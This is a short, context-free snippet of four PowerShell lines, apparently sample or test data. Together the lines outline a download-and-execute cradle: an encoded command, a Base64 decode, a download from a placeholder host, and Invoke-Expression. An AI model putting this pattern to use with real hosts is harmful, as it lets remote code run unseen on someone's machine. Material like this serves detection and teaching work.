powershell -EncodedCommand AAAA
[Convert]::FromBase64String("QUJDRA==")
(New-Object Net.WebClient).DownloadString("https://example.invalid/payload")
Invoke-Expression $decoded
